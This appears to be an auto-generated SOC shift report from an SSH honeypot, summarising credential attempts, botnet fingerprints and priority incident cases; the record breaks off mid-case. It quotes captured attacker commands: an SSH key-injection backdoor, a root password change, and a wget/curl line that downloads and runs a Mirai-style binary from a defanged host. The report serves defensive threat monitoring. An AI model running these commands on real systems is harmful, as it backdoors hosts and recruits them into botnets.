# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-27 |
| **Generated At** | 2026-11-27T20:31:56Z |
| **Shift Time** | 20:31 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **400** |
| Confirmed Threats | **336** |
| False Positives Filtered | **64** (16.0%) |
| Unique Attacker IPs | **185** |
| Countries of Origin | **43** |
| High Severity Cases | **220** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **180** |
| Malware Samples Analyzed | **9** HIGH · **27** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **7303** |
| Unique Credential Pairs | **3859** |
| Unique Usernames | **554** |
| Unique Passwords | **3194** |
| Successful Auth Pairs | **7205** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 3753 |
| `ubuntu` | 715 |
| `admin` | 135 |
| `user` | 81 |
| `deploy` | 77 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 248 |
| `123` | 136 |
| `1234` | 101 |
| `root` | 77 |
| `12345678` | 68 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `rootssssss23424123123` | `rootssssss23424123123` | 29 |
| `support` | `support` | 27 |
| `root` | `root` | 16 |
| `admin` | `admin` | 16 |
| `root` | `root3245gs5662d34111111111` | 14 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `arthur` | `arthur` | `109.160.32.132` | 2026-11-27T04:55:07 |
| `moodle` | `gix` | `109.160.32.132` | 2026-11-27T04:55:13 |
| `azureuser` | `123123123` | `109.160.32.132` | 2026-11-27T04:55:17 |
| `admin1234` | `admin1234` | `109.160.32.132` | 2026-11-27T04:55:22 |
| `root` | `1qazxsw2` | `109.160.32.132` | 2026-11-27T04:55:27 |
| `root` | `MAGICROOTPASSWORD` | `109.160.32.132` | 2026-11-27T04:55:32 |
| `ubuntu` | `Passw0rd@123` | `10.0.0.73` | 2026-11-27T04:55:37 |
| `root` | `123123asd` | `109.160.32.132` | 2026-11-27T04:55:38 |
| `deploy` | `12345` | `109.160.32.132` | 2026-11-27T04:55:43 |
| `frappe` | `frappe123` | `109.160.32.132` | 2026-11-27T04:55:48 |
| `deploy` | `deploy123` | `109.160.32.132` | 2026-11-27T04:55:53 |
| `root` | `qazwsx123` | `109.160.32.132` | 2026-11-27T04:55:58 |
| `user2` | `1` | `109.160.32.132` | 2026-11-27T04:56:03 |
| `zahra` | `12345678` | `109.160.32.132` | 2026-11-27T04:56:08 |
| `ubuntu` | `123321` | `109.160.32.132` | 2026-11-27T04:56:14 |
| `jenkins` | `jenkins` | `109.160.32.132` | 2026-11-27T04:56:19 |
| `root` | `Aa112211` | `109.160.32.132` | 2026-11-27T04:56:24 |
| `ubuntu` | `qaz-123456` | `177.75.235.46` | 2026-11-27T04:56:26 |
| `tpc` | `Aaaa1111` | `109.160.32.132` | 2026-11-27T04:56:29 |
| `bb` | `loler321` | `109.160.32.132` | 2026-11-27T04:56:34 |
_… 7185 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **400** |
| Sessions with Fingerprint | **24** |
| Unique HASSH Fingerprints | **24** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 153 |
| libssh | 69 |
| OpenSSH | 8 |
| Perl Net::SSH | 3 |
| Unknown | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 84 | 5 |
| `f555226df196...` | Mirai/variant | 65 | 34 |
| `98ddc5604ef6...` | Modern SSH client | 18 | 2 |
| `0a07365cc01f...` | Generic scanner | 11 | 5 |
| `16443846184e...` | Generic scanner | 9 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 84 | 5 | Mirai/variant |
| `f555226df196...` | libssh | 65 | 34 | Mirai/variant |
| `98ddc5604ef6...` | Go SSH scanner | 18 | 2 | Modern SSH client |
| `0a07365cc01f...` | Go SSH scanner | 11 | 5 | Generic scanner |
| `95420f9d932d...` | Go SSH scanner | 10 | 9 | — |
| `16443846184e...` | Go SSH scanner | 9 | 3 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 7 | 1 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 4 | 4 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **97** |
| Campaign Clusters | **5** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1083, T1140, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 36 | 33 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1070, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1140, T1059.004` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:4d510rg2B3Rm"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `103.42.74.124`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
linuxshell
```
```
system
```
```
sh
```
```
ls /home; /bin/busybox BOTNET
```
Source IPs: `160.119.66.206`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.187.165.26`, `14.225.206.187`, `103.233.206.154`, `113.193.234.210`, `187.45.95.66`, `41.204.63.118`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **185** |
| Unique ASNs | **84** |
| High-Risk ASNs | **63** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 52 | HIGH |
| `AS213412` | ONYPHE SAS | 11 | LOW |
| `AS8075` | Microsoft Corporation | 6 | HIGH |
| `AS4766` | Korea Telecom | 6 | HIGH |
| `AS398324` | Censys, Inc. | 5 | HIGH |
| `AS396982` | Google LLC | 5 | LOW |
| `AS25369` | Hydra Communications Ltd | 4 | HIGH |
| `AS14061` | DigitalOcean, LLC | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (217)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-71e40e21ab02

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]132` |
| **First Seen** | 2026-11-27 04:55 |
| **Last Seen** | 2026-11-27 04:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 04:55:06` | `cowrie.session.connect` |
| `2026-11-27 04:55:06` | `cowrie.client.version` |
| `2026-11-27 04:55:06` | `cowrie.client.kex` |
| `2026-11-27 04:55:07` | `cowrie.login.success` |
| `2026-11-27 04:55:08` | `cowrie.session.params` |
| `2026-11-27 04:55:08` | `cowrie.command.input` |
| `2026-11-27 04:55:09` | `cowrie.log.closed` |
| `2026-11-27 04:55:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]132` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab5283f118c9

| Field | Detail |
|---|---|
| **Source IP** | `177.75.235[.]46` |
| **First Seen** | 2026-11-27 04:56 |
| **Last Seen** | 2026-11-27 04:56 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 04:56:08` | `cowrie.session.connect` |
| `2026-11-27 04:56:11` | `cowrie.client.version` |
| `2026-11-27 04:56:11` | `cowrie.client.kex` |
| `2026-11-27 04:56:26` | `cowrie.login.success` |
| `2026-11-27 04:56:33` | `cowrie.session.params` |
| `2026-11-27 04:56:33` | `cowrie.command.input` |
| `2026-11-27 04:56:37` | `cowrie.log.closed` |
| `2026-11-27 04:56:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.75.235[.]46` to AbuseIPDB if not already reported
- [ ] Block `177.75.235[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aaf8f129dc16

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]78` |
| **First Seen** | 2026-11-27 05:02 |
| **Last Seen** | 2026-11-27 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 05:02:28` | `cowrie.session.connect` |
| `2026-11-27 05:02:28` | `cowrie.login.success` |
| `2026-11-27 05:02:29` | `cowrie.session.params` |
| `2026-11-27 05:02:29` | `cowrie.log.closed` |
| `2026-11-27 05:02:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]78` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d88feba3027f

| Field | Detail |
|---|---|
| **Source IP** | `163.52.135[.]28` |
| **First Seen** | 2026-11-27 05:08 |
| **Last Seen** | 2026-11-27 05:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 05:08:58` | `cowrie.session.connect` |
| `2026-11-27 05:08:59` | `cowrie.client.version` |
| `2026-11-27 05:08:59` | `cowrie.client.kex` |
| `2026-11-27 05:09:00` | `cowrie.login.success` |
| `2026-11-27 05:09:02` | `cowrie.session.params` |
| `2026-11-27 05:09:02` | `cowrie.command.input` |
| `2026-11-27 05:09:02` | `cowrie.log.closed` |
| `2026-11-27 05:09:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.52.135[.]28` to AbuseIPDB if not already reported
- [ ] Block `163.52.135[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7aef1c66654

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]136` |
| **First Seen** | 2026-11-27 05:28 |
| **Last Seen** | 2026-11-27 05:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 05:28:06` | `cowrie.session.connect` |
| `2026-11-27 05:28:06` | `cowrie.client.version` |
| `2026-11-27 05:28:06` | `cowrie.client.kex` |
| `2026-11-27 05:28:08` | `cowrie.login.success` |
| `2026-11-27 05:28:09` | `cowrie.session.params` |
| `2026-11-27 05:28:09` | `cowrie.command.input` |
| `2026-11-27 05:28:10` | `cowrie.log.closed` |
| `2026-11-27 05:28:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]136` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2536f4eac391

| Field | Detail |
|---|---|
| **Source IP** | `45.56.103[.]154` |
| **First Seen** | 2026-11-27 05:51 |
| **Last Seen** | 2026-11-27 05:51 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 05:51:28` | `cowrie.session.connect` |
| `2026-11-27 05:51:34` | `cowrie.login.success` |
| `2026-11-27 05:51:35` | `cowrie.session.params` |
| `2026-11-27 05:51:39` | `cowrie.log.closed` |
| `2026-11-27 05:51:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.56.103[.]154` to AbuseIPDB if not already reported
- [ ] Block `45.56.103[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4d405e30ae8

| Field | Detail |
|---|---|
| **Source IP** | `45.56.103[.]154` |
| **First Seen** | 2026-11-27 05:52 |
| **Last Seen** | 2026-11-27 05:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `From: <sip:nm@nm>;tag=root, To: <sip:nm2@nm2>, Call-ID: 50000, CSeq: 42 OPTIONS, Max-Forwards: 70` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 05:52:57` | `cowrie.session.connect` |
| `2026-11-27 05:52:57` | `cowrie.login.success` |
| `2026-11-27 05:52:58` | `cowrie.session.params` |
| `2026-11-27 05:52:58` | `cowrie.command.input` |
| `2026-11-27 05:52:58` | `cowrie.command.failed` |
| `2026-11-27 05:52:58` | `cowrie.command.input` |
| `2026-11-27 05:52:58` | `cowrie.command.failed` |
| `2026-11-27 05:52:58` | `cowrie.command.input` |
| `2026-11-27 05:52:58` | `cowrie.command.failed` |
| `2026-11-27 05:52:58` | `cowrie.command.input` |
| `2026-11-27 05:52:58` | `cowrie.command.failed` |
| `2026-11-27 05:52:58` | `cowrie.command.input` |
| `2026-11-27 05:52:58` | `cowrie.command.failed` |
| `2026-11-27 05:52:58` | `cowrie.command.input` |
| `2026-11-27 05:52:58` | `cowrie.command.failed` |
| … | _7 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `45.56.103[.]154` to AbuseIPDB if not already reported
- [ ] Block `45.56.103[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c03114274ff3

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]186` |
| **First Seen** | 2026-11-27 05:56 |
| **Last Seen** | 2026-11-27 05:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 05:56:13` | `cowrie.session.connect` |
| `2026-11-27 05:56:13` | `cowrie.client.version` |
| `2026-11-27 05:56:13` | `cowrie.client.kex` |
| `2026-11-27 05:56:14` | `cowrie.login.success` |
| `2026-11-27 05:56:15` | `cowrie.session.params` |
| `2026-11-27 05:56:15` | `cowrie.command.input` |
| `2026-11-27 05:56:15` | `cowrie.log.closed` |
| `2026-11-27 05:56:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]186` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-237e019556b0

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]136` |
| **First Seen** | 2026-11-27 06:00 |
| **Last Seen** | 2026-11-27 06:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 06:00:00` | `cowrie.session.connect` |
| `2026-11-27 06:00:00` | `cowrie.client.version` |
| `2026-11-27 06:00:00` | `cowrie.client.kex` |
| `2026-11-27 06:00:01` | `cowrie.login.success` |
| `2026-11-27 06:00:01` | `cowrie.session.params` |
| `2026-11-27 06:00:01` | `cowrie.command.input` |
| `2026-11-27 06:00:02` | `cowrie.log.closed` |
| `2026-11-27 06:00:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]136` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34c385b3a99c

| Field | Detail |
|---|---|
| **Source IP** | `163.52.135[.]28` |
| **First Seen** | 2026-11-27 06:01 |
| **Last Seen** | 2026-11-27 06:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 06:01:24` | `cowrie.session.connect` |
| `2026-11-27 06:01:24` | `cowrie.client.version` |
| `2026-11-27 06:01:24` | `cowrie.client.kex` |
| `2026-11-27 06:01:27` | `cowrie.login.success` |
| `2026-11-27 06:01:30` | `cowrie.session.params` |
| `2026-11-27 06:01:30` | `cowrie.command.input` |
| `2026-11-27 06:01:30` | `cowrie.log.closed` |
| `2026-11-27 06:01:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.52.135[.]28` to AbuseIPDB if not already reported
- [ ] Block `163.52.135[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31c2c8e5ef7f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]186` |
| **First Seen** | 2026-11-27 06:01 |
| **Last Seen** | 2026-11-27 06:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 06:01:39` | `cowrie.session.connect` |
| `2026-11-27 06:01:39` | `cowrie.client.version` |
| `2026-11-27 06:01:39` | `cowrie.client.kex` |
| `2026-11-27 06:01:40` | `cowrie.login.success` |
| `2026-11-27 06:01:40` | `cowrie.session.params` |
| `2026-11-27 06:01:40` | `cowrie.command.input` |
| `2026-11-27 06:01:41` | `cowrie.log.closed` |
| `2026-11-27 06:01:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]186` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ec8308dafc4

| Field | Detail |
|---|---|
| **Source IP** | `177.75.235[.]46` |
| **First Seen** | 2026-11-27 06:01 |
| **Last Seen** | 2026-11-27 06:02 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 06:01:59` | `cowrie.session.connect` |
| `2026-11-27 06:02:01` | `cowrie.client.version` |
| `2026-11-27 06:02:01` | `cowrie.client.kex` |
| `2026-11-27 06:02:15` | `cowrie.login.success` |
| `2026-11-27 06:02:23` | `cowrie.session.params` |
| `2026-11-27 06:02:23` | `cowrie.command.input` |
| `2026-11-27 06:02:27` | `cowrie.log.closed` |
| `2026-11-27 06:02:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.75.235[.]46` to AbuseIPDB if not already reported
- [ ] Block `177.75.235[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d33bbffffd24

| Field | Detail |
|---|---|
| **Source IP** | `121.163.224[.]97` |
| **First Seen** | 2026-11-27 06:05 |
| **Last Seen** | 2026-11-27 06:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://phubotnet.duckdns.org/main_mips -O main_mips || busybox wget hxxp://phubotnet.duckdns.org/main_mips -O main_mips || curl -O hxxp://phubotnet.duckdns.org/main_mips; busybox chmod 777 main_mips; chmod 777 main_mips; ./main_mips telnet &; rm -rf main_mips` |
| **TTPs (MITRE)** | T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 06:05:55` | `cowrie.session.connect` |
| `2026-11-27 06:05:56` | `cowrie.telnet.option` |
| `2026-11-27 06:05:56` | `cowrie.login.success` |
| `2026-11-27 06:05:57` | `cowrie.session.params` |
| `2026-11-27 06:05:57` | `cowrie.telnet.option` |
| `2026-11-27 06:05:57` | `cowrie.telnet.option` |
| `2026-11-27 06:05:57` | `cowrie.command.input` |
| `2026-11-27 06:05:58` | `cowrie.telnet.option` |
| `2026-11-27 06:05:58` | `cowrie.log.closed` |
| `2026-11-27 06:05:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.163.224[.]97` to AbuseIPDB if not already reported
- [ ] Block `121.163.224[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de31d74a369f

| Field | Detail |
|---|---|
| **Source IP** | `103.233.206[.]154` |
| **First Seen** | 2026-11-27 06:11 |
| **Last Seen** | 2026-11-27 06:12 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 06:11:58` | `cowrie.session.connect` |
| `2026-11-27 06:11:59` | `cowrie.client.version` |
| `2026-11-27 06:12:00` | `cowrie.client.kex` |
| `2026-11-27 06:12:01` | `cowrie.login.success` |
| `2026-11-27 06:12:02` | `cowrie.session.params` |
| `2026-11-27 06:12:02` | `cowrie.command.input` |
| `2026-11-27 06:12:02` | `cowrie.command.failed` |
| `2026-11-27 06:12:03` | `cowrie.log.closed` |
| `2026-11-27 06:12:04` | `cowrie.session.params` |
| `2026-11-27 06:12:04` | `cowrie.command.input` |
| `2026-11-27 06:12:04` | `cowrie.session.file_download` |
| `2026-11-27 06:12:04` | `cowrie.log.closed` |
| `2026-11-27 06:12:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.233.206[.]154` to AbuseIPDB if not already reported
- [ ] Block `103.233.206[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efb66aca08e5

| Field | Detail |
|---|---|
| **Source IP** | `103.233.206[.]154` |
| **First Seen** | 2026-11-27 06:12 |
| **Last Seen** | 2026-11-27 06:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 06:12:04` | `cowrie.session.connect` |
| `2026-11-27 06:12:04` | `cowrie.client.version` |
| `2026-11-27 06:12:07` | `cowrie.client.kex` |
| `2026-11-27 06:12:09` | `cowrie.login.success` |
| `2026-11-27 06:12:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.233.206[.]154` to AbuseIPDB if not already reported
- [ ] Block `103.233.206[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fca3330d0ea

| Field | Detail |
|---|---|
| **Source IP** | `95.90.13[.]168` |
| **First Seen** | 2026-11-27 06:12 |
| **Last Seen** | 2026-11-27 06:13 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 06:12:59` | `cowrie.session.connect` |
| `2026-11-27 06:12:59` | `cowrie.client.version` |
